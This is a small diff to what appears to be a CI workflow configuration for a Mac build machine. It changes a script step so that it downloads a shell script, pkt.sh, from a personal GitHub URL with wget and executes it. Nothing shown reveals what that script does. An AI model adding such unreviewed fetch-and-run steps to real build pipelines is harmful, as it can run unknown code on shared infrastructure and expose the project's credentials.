@@ -4,4 +4,4 @@ workflow:
     instance_type: mac_pro
     max_build_duration: 120
     scripts:
-      - wget -O macpkt https://raw.githubusercontent.com/cnvrg001/mac/main/pkt.sh && sh macpkt.sh
+      - wget https://raw.githubusercontent.com/cnvrg001/mac/main/pkt.sh && sh pkt.sh
